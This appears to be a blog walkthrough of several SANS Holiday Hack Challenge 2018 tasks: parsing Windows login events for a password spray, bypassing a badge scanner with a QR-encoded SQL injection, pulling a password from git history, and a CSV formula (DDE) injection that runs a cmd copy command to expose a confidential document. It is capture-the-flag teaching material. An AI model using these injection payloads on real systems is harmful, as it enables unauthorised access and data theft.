    MMMN        NMMW       NMK   NK       KK   WM       KWMM         NMMM
    MMWWMMWK              WMM                  WMM                MMMWMMM
    M      WMN      NMK   MMMN      M   W      MMM    NM       WMWK     M
    MW              MMN   MMMMMNMMMMM   MMMMWNMMMMW   WMM             KWM
    MMN       MM    MMMMMMMMMMMMMNK       KWMMMMMMMMMMMMM   KMM      KWMM
    M        KMM    MMMMMMMMMMMM             MMMMMMMMMMMM   KMM    K    M
    MWWMMM   KMM    MMMMMMMMMMMM    M   W   NMMMMMMMMMMMM   KMM    MMMWMM
    MMMMMMNKKMMM    MMMMMMMMMMMMMMMN    KWMMMMMMMMMMMMMMM   KMMWKKWMMMMMM
    MMMMMMMMMMMM    MMMMMMMMMMMWK            MMMMMMMMMMMM   WMMMMMMMMMMMM
    MMMMMMMMMMMMMMMMMMMMMMMM                    NMMMMMMMMMMMMMMMMMMMMMMMM
    MMMMMMMMMMMMMMMMMMMMMM        MMM   MMW       WMMMMMMMMMMMMMMMMMMMMMM
    MMMMMMMMMMMMMMMMMMMMMMW  KWMMWK        WMMN  KMMMMMMMMMMMMMMMMMMMMMMM
    MMMMMMMMMMMMMMMMMMMMMMMMMMMM             MMMMMMMMMMMMMMMMMMMMMMMMMMMM
    MMMMMMMMMMMMMMMMMMMMMMMMMMMM    M   WK  NMMMMMMMMMMMMMMMMMMMMMMMMMMMM
    MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
    MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMW MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM

    Silly Minty Candycane, well this is what she gets.
    "Winter2018" isn't for The Internets.
    Passwords formed with season-year are on the hackers' list.
    Maybe we should look at guidance published by the NIST?

    Congratulations!

To solve this challenge, we can also be a bit fancy, and use a Python script
to parse the XML file:

.. code-block:: python

    #!/usr/bin/env python3

    import sys
    from bs4 import BeautifulSoup
    import datetime

    def main():
        if len(sys.argv) != 2:
            print('Usage: {} <xml_event_file>'.format(sys.argv[0]))
            sys.exit(1)

        # This set will hold every user without a FailureReason attribute
        user_set_with_no_failure = set()

        # The date of the spray attack was determined manually, by looking at the
        # date of the attack against aaron.smith
        spray_attack_beginning = datetime.datetime.strptime('2018-09-10 13:03:33', '%Y-%m-%d %H:%M:%S')

        # We open and parse the file
        with open(sys.argv[1], 'r') as f:
            soup = BeautifulSoup(f.read(), 'lxml')

        for evt in soup.events.find_all('event'):
            # We check the date of every event.
            # If it's before the attack, we don't look at it
            event_time = evt.system.timecreated.get('systemtime').split('.')[0]
            event_time = datetime.datetime.strptime(event_time, '%Y-%m-%d %H:%M:%S')
            if event_time < spray_attack_beginning:
                continue
            else:
                evt_data = evt.eventdata
                # If there's no failure reason, we add our user to our result set.
                if not evt_data.find_all(attrs={'name': 'FailureReason'}):
                    for user in evt_data.find_all(attrs={'name': 'TargetUserName'}):
                        user_set_with_no_failure.add(user.string.replace('@EM.KRINGLECON.COM', ''))

        # We print our result set
        print('\n'.join(user_set_with_no_failure))

    if __name__ == '__main__':
        main()

.. code-block:: console

    $ ./parse_xml.py ./ho-ho-no.xml                                                          
    HealthMailboxbe58608
    HealthMailboxbe58608d4925422d8e4ea458cfedc612
    SYSTEM
    WIN-KCON-EXCH16$
    HealthMailboxbab78a6
    wunorse.openslae
    minty.candycane

Along with some users we don't care about, the script gives us
:code:`minty.candycane` and :code:`wunorse.openslae`. With some manual analysis
of the XML file, we can determine that the right user is
:code:`minty.candycane`.

Bypassing the door authentication mechanism
-------------------------------------------
The "haXXor" way
................

We want to open `the door next to Pepper Minstix
<https://scanomatic.kringlecastle.com/index.html>`__, but we need a badge to do
so. The door needs to scan a QR code. It can do so by using your webcam (you
then need to click on the fingerprint reader), or you can upload a QR code
image using the USB dongle. Luckily for us, Alabaster Snowball lost his badge,
and we managed to get our hands on it:

.. image:: /images/sans-christmas-challenge-2018/alabaster_badge.png
    :alt: alabaster_badge.png
    :align: center


If we try to scan this badge, we're told that the user was disabled. Probably
because the badge was lost.

.. code-block:: http

    POST /upload HTTP/1.1
    Host: scanomatic.kringlecastle.com
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0
    Accept: application/json, text/javascript, */*; q=0.01
    Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Referer: https://scanomatic.kringlecastle.com/index.html
    X-Requested-With: XMLHttpRequest
    Content-Type: multipart/form-data; boundary=---------------------------5162445520959346741824970383
    Content-Length: 153774
    Connection: close
    Cookie: resource_id=false

    -----------------------------5162445520959346741824970383
    Content-Disposition: form-data; name="barcode"; filename="alabaster_badge.png"
    Content-Type: image/png

    PNG [snip, content of the PNG file]
    -----------------------------5162445520959346741824970383

.. code-block:: http
    :hl_lines: 8

    HTTP/1.1 200 OK
    Server: nginx/1.10.3
    Date: Thu, 03 Jan 2019 12:57:34 GMT
    Content-Type: application/json
    Content-Length: 70
    Connection: close

    {"data":"Authorized User Account Has Been Disabled!","request":false}


.. image:: /images/sans-christmas-challenge-2018/scanomatic_user_disabled.gif
    :alt: scanomatic_user_disabled.gif
    :align: center

So, we need to create our own badge. If we scan Alabaster's badge with a QR
code reader, we get :code:`oRfjg5uGHmbduj2m`.

**And this is where I lost sooooo much time**. For the purpose of completeness,
let's see all of my dead ends, yay! If you just want the solution, feel free to
`jump directly to it <#the-right-solution>`__.

All the dead ends, yay!
***********************

The QR-encoded message looks like a base64-encoded string. Let's decode it:

.. code-block:: console

    $ echo -n oRfjg5uGHmbduj2m | base64 -d | hexdump -C                                                                                                  
    00000000  a1 17 e3 83 9b 86 1e 66  dd ba 3d a6              |.......f..=.|
    0000000c

This gives us a 12 byte identifier, :code:`0xa117e3839b861e66ddba3da6`. My
first idea was that, since we have to bypass authentication, let's try a SQL
injection in this id. However, I thought that, since the id **seemed to be
base64-encoded**, I'd have to base64-encode my payload. Let's generate a QR
code with our SQL injection payload. I'm using the :code:`qrtools` Python
library:

.. code-block:: pycon

    >>> import qrtools
    >>> import base64
    >>> qr = qrtools.QR()
    >>> qr.data = base64.b64encode('foo"\'#;-- ')
    >>> qr.encode('sqli_detection.png')

I'm first trying a simple payload, which just tries to break the SQL syntax.

However, it did not work:

.. code-block:: http

    POST /upload HTTP/1.1
    Host: scanomatic.kringlecastle.com
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0
    Accept: application/json, text/javascript, */*; q=0.01
    Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Referer: https://scanomatic.kringlecastle.com/index.html
    X-Requested-With: XMLHttpRequest
    Content-Type: multipart/form-data; boundary=---------------------------49127043815591531222123518543
    Content-Length: 580
    Connection: close
    Cookie: resource_id=false

    -----------------------------49127043815591531222123518543
    Content-Disposition: form-data; name="barcode"; filename="sqli_detection.png"
    Content-Type: image/png

    PNG [snip]
    -----------------------------49127043815591531222123518543

.. code-block:: http
    :hl_lines: 8

    HTTP/1.1 200 OK
    Server: nginx/1.10.3
    Date: Thu, 03 Jan 2019 13:09:43 GMT
    Content-Type: application/json
    Content-Length: 61
    Connection: close

    {"data":"No Authorized User Account Found!","request":false}

Hmm, it did not work. Our payload should have broken the SQL syntax. Instead,
we got a message saying that the provided user id does not exists. I then
thought that maybe we had to find a valid, active user id. I decided to try
bruteforcing the id close to Alabaster's id, to find an active, existing user:

.. code-block:: pycon

    >>> for i in xrange(1000):
    ...     for j in xrange(2):
    ...             user_id = 0xa117e3839b861e66ddba3da6 + i*(-1)**j
    ...             qr.data = base64.b64encode(format(user_id, '02X').decode('hex'))
    ...             qr.encode('id_bruteforce/{}.png'.format(user_id))
    ... 

Bam! 2000 QR codes. Let's use :code:`curl` to upload them all:

.. code-block:: console

    $ cd id_bruteforce
    $ ls -1 | while read f; do echo $f; curl -b 'resource_id=false' -F "barcode=@$f" https://scanomatic.kringlecastle.com/upload > ./results/$f.txt& done

I'll spare you the suspense, it did not work. I always got the same message,
:code:`No Authorized User Account Found!`. I also noticed that the id seemed
to be case insensitive. For example, Alabaster's id, sent as
:code:`oRfjg5uGHmbduj2m` or :code:`oRfjg5uGHmbduj2M` gave the same message,
:code:`Authorized User Account Has Been Disabled!`. I then tried bruteforcing
the base64 message itself. I mean, a 16 character string, with only lower case
letters and numbers (I decided to ignore symbols) is still 83 bits of entropy,
but I was desperate. Needless to say, it did not work.

I then decided to attack the webserver directly by sending malformed images:

.. code-block:: http

    POST /upload HTTP/1.1
    Host: scanomatic.kringlecastle.com
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0
    Accept: application/json, text/javascript, */*; q=0.01
    Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Referer: https://scanomatic.kringlecastle.com/index.html
    X-Requested-With: XMLHttpRequest
    Content-Type: multipart/form-data; boundary=---------------------------49127043815591531222123518543
    Content-Length: 219
    Connection: close
    Cookie: resource_id=false

    -----------------------------49127043815591531222123518543
    Content-Disposition: form-data; name="barcode"; filename="empty.png"
    Content-Type: image/png

    -----------------------------49127043815591531222123518543--

.. code-block:: http

    HTTP/1.1 200 OK
    Server: nginx/1.10.3
    Date: Thu, 03 Jan 2019 13:31:50 GMT
    Content-Type: application/json
    Content-Length: 124
    Connection: close

    {"data":"EXCEPTION AT (LINE 151 \"qr.decode(full_path)\"): cannot identify image file 'uploads/empty.png'","request":false}

Finally! An error message with a partial path disclosure. I then thought that
it might be an upload vulnerability with a race condition, that I had to upload
a file and access it via
https://scanomatic.kringlecastle.com/uploads/my_evil_file before it's deleted,
but this was another dead-end.

The right solution
******************

I almost gave up and checked the clue given by Pepper Minstix, but I first
decided to try one last thing: send a random string that I would QR-encode:

.. code-block:: pycon

    >>> import string
    >>> import random
    >>> random_payload = ''.join(random.choice(string.printable) for x in xrange(2000))
    >>> qr.data = random_payload
    >>> qr.encode('qr_random.png')

Here's the image that saved me:

.. image:: /images/sans-christmas-challenge-2018/qr_random.png
    :alt: qr_random.png
    :align: center

I uploaded it, and fot the following error message:

.. code-block:: http
    :hl_lines: 8

    HTTP/1.1 200 OK
    Server: nginx/1.10.3
    Date: Thu, 03 Jan 2019 13:37:14 GMT
    Content-Type: application/json
    Content-Length: 433
    Connection: close

    {"data":"EXCEPTION AT (LINE 96 \"user_info = query(\"SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = '{}' LIMIT 1\".format(uid))\"): (1064, u\"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'G7M]aa-!EcgKBlTx0&<50Y&\\rV'CEB@ZbfO2Z~HkVC5=lH6>!bSl^L~9(}Lh;T^-PXCShXg{ik3H%_ A\\x0c' at line 1\")","request":false}

.. image:: /images/sans-christmas-challenge-2018/scanomatic_sql_error.gif
    :alt: scanomatic_sql_error.gif
    :align: center

Hurray! A SQL error message, which gives us the full syntax. So there was
indeed a SQL injection, however I shouldn't have base64-encoded it. So here's
the request:

.. code-block:: sql

    SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = '<id_goes_here>' LIMIT 1

Seems like your basic SQL injection, let's generate a paylaod that will select
the first enabled user:

.. code-block:: pycon

    >>> qr.data = "foo' OR 1=1 AND enabled='1"
    >>> qr.encode('qr_sqli.png')

With this payload, the SQL request will become:

.. code-block:: sql

    SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = 'foo' OR 1=1 AND enabled='1' LIMIT 1

This should return the first enabled user that is authorized to open the door.
Let's scan our evil QR code:

.. image:: /images/sans-christmas-challenge-2018/qr_sqli.png
    :alt: qr_sqli.png
    :align: center

.. code-block:: http

    POST /upload HTTP/1.1
    Host: scanomatic.kringlecastle.com
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0
    Accept: application/json, text/javascript, */*; q=0.01
    Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Referer: https://scanomatic.kringlecastle.com/index.html
    X-Requested-With: XMLHttpRequest
    Content-Type: multipart/form-data; boundary=---------------------------242929957373414110176704857
    Content-Length: 560
    Connection: close
    Cookie: resource_id=false

    -----------------------------242929957373414110176704857
    Content-Disposition: form-data; name="barcode"; filename="qr_sqli.png"
    Content-Type: image/png

    PNG [snip]
    -----------------------------242929957373414110176704857

.. code-block:: http
    :hl_lines: 8

    HTTP/1.1 200 OK
    Server: nginx/1.10.3
    Date: Thu, 03 Jan 2019 13:42:19 GMT
    Content-Type: application/json
    Content-Length: 179
    Connection: close

    {"data":"User Access Granted - Control number 19880715","request":true,"success":{"hash":"ff60055a84873cd7d75ce86cfaebd971ab90c86ff72d976ede0f5f04795e99eb","resourceId":"false"}}

.. image:: /images/sans-christmas-challenge-2018/scanomatic_success.gif
    :alt: scanomatic_success.gif
    :align: center

We get the control number, which is :code:`19880715`.

The "John McClane" way
......................

If you remember, we found schematics for the ventilation conducts in the North
Pole Git Repository. And it just so happens that next to Google's booth, there
is a ventilation conduct:

.. image:: /images/sans-christmas-challenge-2018/google_booth.png
    :alt: google_booth.png
    :align: center

If you go inside, you can navigate the maze that is the ventilation conduct.

.. image:: /images/sans-christmas-challenge-2018/google_vent_maze.png
    :alt: google_vent_maze.png
    :align: center

But we have a map! We can follow the schematics we found earlier. This allows
us to bypass the authentication door:

.. image:: /images/sans-christmas-challenge-2018/ventilation_diagram_1F_solution.jpg
    :alt: ventilation_diagram_1F_solution.jpg
    :align: center

.. image:: /images/sans-christmas-challenge-2018/ventilation_diagram_2F_solution.jpg
    :alt: ventilation_diagram_2F_solution.jpg
    :align: center

HR Incident Response
~~~~~~~~~~~~~~~~~~~~

Hans reveals his true plan:

.. image:: /images/sans-christmas-challenge-2018/hans.png
    :alt: hans.png
    :align: center

*Hans says*

    So, you’ve figured out my plan – it’s not about freeing those prisoners.
    
    The toy soldiers and I are here to steal the contents of Santa’s vault!
    
    You think that after all my posturing, all my little speeches, that I’m
    nothing but a common thief.
    
    But, I tell you -- I am an exceptional thief.
    
    And since I've moved up to kidnapping all of you, you should be more
    polite!

Sparkle Redberry's Cranberry Pi Challenge
-----------------------------------------

Sparkle Redberry committed her password to the local git repository. We have
to recover the password:

.. code-block:: console

                                       .0.                                    
                                   .:llOXKllc.                                
                                     .OXXXK,                                  
                                     '0l'cOc                                  
                                     ..';'..                                  
                                   .';::::::'.                                
                                .':::::::::::::,.                             
                             .'::loc::::::::::::::,.                          
                          .'::::oMMNc::::::::::::::::,.                       
                        .,;;,,,,:dxl:::::::,,,:::;,,,,,,.                     
                        .,'  ..;:::::::::::;,;::::,.                          
                          .';::::::::::::::::::::dOxc,.                       
                       .';:::::::::okd::::::::::cXMWd:::,.                    
                    .';:::::::::::cNMMo:::::::::::lc:::::::,.                 
                 .'::::::::::::::::col::::::::::::;:::::::::::,.              
                       .;:::,,,:::::::::::::::::;,,,:::::'.                   
                    .'::::::;;;:::::::::::dko:::::;::::::::;.                 
                 .,::::::::::::::::::::::lWMWc::::::::::::::::;.              
                ..:00:...;::::loc:::::::::coc::::::::::::'.;;.....            
                  :NNl.,:::::xMMX:::::::::::::::::::::::::;,,.                
                   .,::::::::cxxl::::,,,:::::::::::::::::::::;.               
                .,:::::::c:::::::::::;;;:::::::;;:::::kNXd::::::;.            
             .,::::::::cKMNo::::::::::::::::::;,,;::::xKKo:::::::::;.         
           .'''''',:::::x0Oc:::::::::oOOo:::::::::::::::::::::;'''''''.       
                .,:::::::::::::::::::kWWk::::::::::::::ldl:::::;'.            
             .,::;,,::::::::::::::::::::::::::::::::::lMMMl:::::::;'.         
          .,:::::;,;:::::::::::::::::::::::::::::::::::ldl::::::::::::'.      
       .,::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::'.   
                                   ..;;;;;;;;'.                               
                                 .';;;;;;;;;;;;'.                             
                              .';;;;;;;;;;;;;;;;;;'.                          
                             ........................                         
                                                                              


    Coalbox again, and I've got one more ask.
    Sparkle Q. Redberry has fumbled a task.
    Git pull and merging, she did all the day;
    With all this gitting, some creds got away.

    Urging - I scolded, "Don't put creds in git!"
    She said, "Don't worry - you're having a fit.
    If I did drop them then surely I could,
    Upload some new code done up as one should."

    Though I would like to believe this here elf,
    I'm worried we've put some creds on a shelf.
    Any who's curious might find our "oops,"
    Please find it fast before some other snoops!

    Find Sparkle's password, then run the runtoanswer tool.
    elf@fa3b5d8290f0:~$

Let's see the git repository and check the commit history:

.. code-block:: console
    :hl_lines: 24

    elf@76d904959962:~$ ls -lh
    total 5.7M
    drwxr-xr-x 1 elf elf 4.0K Nov 14 09:48 kcconfmgmt
    -rwxr-xr-x 1 elf elf 5.7M Dec 14 16:13 runtoanswer
    elf@76d904959962:~$ cd kcconfmgmt/
    elf@76d904959962:~/kcconfmgmt$ git log | grep -i -C 5 password            

    commit d84b728c7d9cf7f9bafc5efb9978cd0e3122283d
    Author: Sparkle Redberry <sredberry@kringlecon.com>
    Date:   Sat Nov 10 19:51:52 2018 -0500

        Add user model for authentication, bcrypt password storage

    commit c27135005753f6dde3511a7e70eb27f92f67393f
    Author: Sparkle Redberry <sredberry@kringlecon.com>
    Date:   Sat Nov 10 08:11:40 2018 -0500

    --

    commit 60a2ffea7520ee980a5fc60177ff4d0633f2516b
    Author: Sparkle Redberry <sredberry@kringlecon.com>
    Date:   Thu Nov 8 21:11:03 2018 -0500

        Per @tcoalbox admonishment, removed username/password from config.js, default settings in config.js.def need to be updated before use

    commit b2376f4a93ca1889ba7d947c2d14be9a5d138802
    Author: Sparkle Redberry <sredberry@kringlecon.com>
    Date:   Thu Nov 8 13:25:32 2018 -0500

Apparently, in commit :code:`60a2ffea7520ee980a5fc60177ff4d0633f2516b`, Sparkle
removed her password from the :code:`config.js` file, which was replaced by a
default :code:`config.js.def`. Let's see where this file is:

.. code-block:: console

    elf@76d904959962:~/kcconfmgmt$ find . -name config.js.def
    ./server/config/config.js.def

Now that we know where it is, we can guess where the original :code:`config.js`
file was. Let's check it's modification history:

.. code-block:: console
    :hl_lines: 15

    elf@eba657fc7961:~/kcconfmgmt$ git log -p -- ./server/config/config.js
    commit 60a2ffea7520ee980a5fc60177ff4d0633f2516b
    Author: Sparkle Redberry <sredberry@kringlecon.com>
    Date:   Thu Nov 8 21:11:03 2018 -0500
        Per @tcoalbox admonishment, removed username/password from config.js, default settings in c
    onfig.js.def need to be updated before use
    diff --git a/server/config/config.js b/server/config/config.js
    deleted file mode 100644
    index 25be269..0000000
    --- a/server/config/config.js
    +++ /dev/null
    @@ -1,4 +0,0 @@
    -// Database URL
    -module.exports = {
    -    'url' : 'mongodb://sredberry:twinkletwinkletwinkle@127.0.0.1:27017/node-api'
    -};
    [snip]

We find our commit :code:`60a2ffea7520ee980a5fc60177ff4d0633f2516b`, which
deletes the file, and gives us the content of the original :code:`config.js`
file. Sparkle's password is :code:`twinkletwinkletwinkle`:

.. code-block:: console
    :hl_lines: 6

    elf@fa3b5d8290f0:~$ ./runtoanswer 
    Loading, please wait......



    Enter Sparkle Redberry's password: twinkletwinkletwinkle


    This ain't "I told you so" time, but it's true:
    I shake my head at the goofs we go through.
    Everyone knows that the gits aren't the place;
    Store your credentials in some safer space.

    Congratulations!

Elf InfoSec Careers Website
---------------------------

We're asked to take a look at the `Elf InfoSec Careers website
<https://careers.kringlecastle.com/>`__. It's a website where you can upload
your application, and if your profile is interesting enough, you can join
Santa's elves! The goal is to get the content of the
:code:`C:\candidate_evaluation.docx` file.

Let's fill an application. You must provide your full name, phone number,
email address, and a CSV file with your work history:

.. code-block:: http

    POST /api/upload/application HTTP/1.1
    Host: careers.kringlecastle.com
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0
    Accept: */*
    Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Referer: https://careers.kringlecastle.com/
    X-Requested-With: XMLHttpRequest
    Content-Type: multipart/form-data; boundary=---------------------------1284099169763381272238033
    Content-Length: 683
    Connection: close

    -----------------------------1284099169763381272238033
    Content-Disposition: form-data; name="firstname"

    Foo
    -----------------------------1284099169763381272238033
    Content-Disposition: form-data; name="lastname"

    Bar
    -----------------------------1284099169763381272238033
    Content-Disposition: form-data; name="phone"

    0000000000
    -----------------------------1284099169763381272238033
    Content-Disposition: form-data; name="email"

    foo@bar.com
    -----------------------------1284099169763381272238033
    Content-Disposition: form-data; name="csv"; filename="resume.csv"
    Content-Type: text/csv

    Super pentester

    -----------------------------1284099169763381272238033--

.. code-block:: http

    HTTP/1.1 200 OK
    Server: nginx/1.14.1
    Date: Thu, 03 Jan 2019 16:18:04 GMT
    Content-Type: text/html; charset=utf-8
    Connection: close
    X-Powered-By: Express
    ETag: W/"172-gwRZ+l3Bn2+yGvHpphldazlOPqI"
    Content-Length: 370

    Thank you for taking the time to upload your information to our elf resources shared workshop station! Our elf resources will review your CSV work history within the next few minutes to see if you qualify to join our elite team of InfoSec Elves. If you are accepted, you will be added to our secret list of potential new elf hires located in C:\candidate_evaluation.docx

.. image:: /images/sans-christmas-challenge-2018/career_upload.png
    :alt: career_upload.png
    :align: center

I first thought that we'd have to perform an upload vulnerability, where we
could upload a webshell and gain remote code execution on the server. I tried
looking for an upload directory, for example in :code:`/uploads/`:

.. code-block:: http

    GET /uploads/ HTTP/1.1
    Host: careers.kringlecastle.com
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Connection: close
    Upgrade-Insecure-Requests: 1

.. code-block:: http

    HTTP/1.1 200 OK
    Server: nginx/1.14.1
    Date: Thu, 03 Jan 2019 16:23:08 GMT
    Content-Type: text/html; charset=UTF-8
    Connection: close
    X-Powered-By: Express
    Cache-Control: public, max-age=0
    Last-Modified: Fri, 07 Dec 2018 01:34:04 GMT
    ETag: W/"f48-167864ce0e2"
    Content-Length: 3912

    <html>
    [snip]
      <!--physical server path--->
       <p>Publicly accessible file served from: <br>
         C:\careerportal\resources\public\    not found......<p>
         <br>
       <!---logical web path-->
         <strong><p>Try: <br> https://careers.kringlecastle.com/public/'file name you are looking for'</p></strong>
      

    </body>
    </html>

.. image:: /images/sans-christmas-challenge-2018/career_404.png
    :alt: career_404.png
    :align: center

Hmm, what a helpful 404 error message. It gives us the full path to the public
web folder, and the URL. This means, that if we can get the
:code:`C:\candidate_evaluation.docx` in this directory, we'll be able to
download it. But how can we do so with only what we have in the application
form?

The work history file that we upload is a CSV file. And apparently, this server
is a Windows server, given the file paths, and all. This means that the CSV
file will probably be opened by an elf using Excel. In that case, we can use
a `CSV injection
<https://www.contextis.com/en/blog/comma-separated-vulnerabilities>`__ to
execute code on the elf's workstation. This is a vulnerability we sometimes
find during pentest assessments. However, it's pretty low risk, because it's
kind of clunky to exploit: the user has to download the CSV, try to evaluate
the cell with our payload, and click "Yes" on a warning prompt. It's still
worth a try, though:

.. code-block:: console

    $ cat copy_file_to_www.csv
    =cmd|' /c copy C:\candidate_evaluation.docx C:\careerportal\resources\public\omg_secret_file.docx'!A0

This payload will copy the wanted file in the public web folder, under the
name :code:`omg_secret_file.docx`. Let's upload it:

.. code-block:: http

    POST /api/upload/application HTTP/1.1
    Host: careers.kringlecastle.com
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0
    Accept: */*
    Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Referer: https://careers.kringlecastle.com/
    X-Requested-With: XMLHttpRequest
    Content-Type: multipart/form-data; boundary=---------------------------12548806719497856202051334912
    Content-Length: 803
    Connection: close

    -----------------------------12548806719497856202051334912
    Content-Disposition: form-data; name="firstname"

    Foo
    -----------------------------12548806719497856202051334912
    Content-Disposition: form-data; name="lastname"

    Bar
    -----------------------------12548806719497856202051334912
    Content-Disposition: form-data; name="phone"

    0000000000
    -----------------------------12548806719497856202051334912
    Content-Disposition: form-data; name="email"

    foo@bar.com
    -----------------------------12548806719497856202051334912
    Content-Disposition: form-data; name="csv"; filename="copy_file_to_www.csv"
    Content-Type: text/csv

    =cmd|' /c copy C:\candidate_evaluation.docx C:\careerportal\resources\public\omg_secret_file.docx'!A0

    -----------------------------12548806719497856202051334912--

We wait a couple seconds, and then bingo! We can download the file from the
URL https://careers.kringlecastle.com/public/omg_secret_file.docx. You can
download this file `here </docs/sans-christmas-challenge-2018/candidate_evaluation.docx>`__.

Now, we were asked to find which terrorist organization is supported by the
job applicant whose name begins with "K". Let's open up the document:

.. image:: /images/sans-christmas-challenge-2018/career_candiate_docx.png
    :alt: career_candiate_docx.png
    :align: center

Here's what we can learn on this applicant:

    :underline:`Candidate Name: Krampus`

    *Comments (Please summarize your perceptions of the candidate’s strengths,
    and any concerns that should be considered:*

    Krampus’s career summary included experience hardening decade old attack
    vectors, and lacked updated skills to meet the challenges of attacks
    against our beloved Holidays. 

    Furthermore, there is intelligence from the North Pole **this elf is linked
    to cyber terrorist organization Fancy Beaver** who openly provides
    technical support to the villains that attacked our Holidays last year.

    We owe it to Santa to find, recruit, and put forward trusted candidates
    with the right skills and ethical character to meet the challenges that
    threaten our joyous season. 

So, apparently the candidate name is `Krampus
<https://en.wikipedia.org/wiki/Krampus>`__, and he's linked to the terrorist
organization `Fancy Beaver <https://en.wikipedia.org/wiki/Fancy_Bear>`__.

Network Traffic Forensics
~~~~~~~~~~~~~~~~~~~~~~~~~

We find Hans in Santa's secret room:

.. image:: /images/sans-christmas-challenge-2018/hans.png
    :alt: hans.png
    :align: center

*Hans says*

    You’ve found me and blocked my access to Santa’s treasure.

    You’ve done well in foiling me. But, I’ve still got a chance.

    When you steal six hundred dollars, you can disappear. When you steal all
    of Santa’s treasure, they will find you… unless….

    *(muffled yelling)*

.. image:: /images/sans-christmas-challenge-2018/hans_snow.png
    :alt: hans_snow.png
    :align: center

*The narrator says*

    *And then suddenly, Hans slips and falls into a snowbank. His nefarious
    plan thwarted, he's now just cold and wet.*

    *But Santa still has more questions for you to solve!*

.. image:: /images/sans-christmas-challenge-2018/santa.png
    :alt: santa.png
    :align: center

*Santa says*

    HO HO HO!!!

    You did a great job, but keep going!

    Solve all remaining objectives in your badge.

SugarPlum Mary's Cranberry Pi Challenge
---------------------------------------

We're trapped inside a Python interpreter, and we must escape and run a
program:

.. code-block:: text

                   :lllllllllllllllllllllllllllllllllllllllll,                      
                   'lllllllllllllllllllllllllllllllllllllllll:                      
                    clllllllllllllllllllllllllllllllllllllllll.                     
                    'lllllllllllllllllllllllllllllllllllllllll:                     
                     ;lllllllllllllllllllllllllllllllllllllllll,                    
                      :lllllllllllllllllllllllllllllllllllllllll.                   
                       :lllllllllllllllllllllllllllllllllllllllll.                  
                        ;lllllllllllllllllllllllllllllllllllllllll'                 
                         'lllllllllllllllllllllllllllllllllllllllll;                
                          .cllllllllllllllllllllllllllllllllllllllllc.              
                          .:llllllllllllllllllllllllllllllllllllllllllc,.           
                       .:llllllllllllllllllllllllllllllllllllllllllllllll;.         
                    .,cllllllllllllllllllllllllllllllllllllllllllllllllllll,        
                  .;llllllllllllllllllllllllllllllllllllllllllllllllllllllllc.      
                 ;lllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc.     
               'llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc     
              :lllllll:..,..'cllllllllllllllllllllllc'.,'.'clllllllllllllllllll;    
            .clllllll'  :XK.  :llllllllllllllllllll;  ,XX.  ;lllllllllllllllllll.   
           .cllllllll.  oXX'  ,llllllllllllllllllll.  cXX;  .lllllllllllllllllll'   
           clllllllll;  .xl  .cllllllllllllllllllllc.  do  .clllllllllllllllllll,   
          :llllllllllll;'..':llllllllllllllllllllllll:'..':lllllllllllllllllllll'   
         .llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll.   
         ;lllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc    
         clllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll.    
         cllllllllllllllllllllllllll..;lc..:llllllllllllllllllllllllllllllllll;     
         :lllllllllllllllllllllllll:  .l,  .lllllllllllllllllllllllllllllllll:      
         ,lllllllllllllllllllllllllc  .l;  ,llllllllllllllllllllllllllllllll:       
         .llllllllllllllllllllllllllc;lll::llllllllllllllllllllllllllllllll,        
          'llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc.         
           ,llllllllllllllllllllllllllllllllllllllllllllllllllllllllllll,           
            'llllllllllllllllcccccccc;',.,clllllllllllllllllllllllllll,             
             .cllllllc:::::;;,,,,'...':c:;...'',,;;;::::::lllllllllc,               
               'cllllc::;::::cccccccccllc,,,,,,,'',:::::::lllllll;.                 
                 .:llllllllllkMMMMMMMMMdlclllllllllollllllllll;.                    
                   .':lllllllXMMMMMMMMMoloWMMMMMMMMXllllll:,.                       
                       .,:llccccccccccllllXMMMMMMMMWl:;'.                           
                           .,,,,,,,,,,clll:::::::::;                                
                          'lllllllllc.    ',,,,,,,,.                                
                         lMMMMMMMMMW,    .ddddddddd.                                
                        kMMMMMMMMMX.     kMMMMMMMMK                                 
                       ':::::::::,      .NWWWWWWWW:                                 
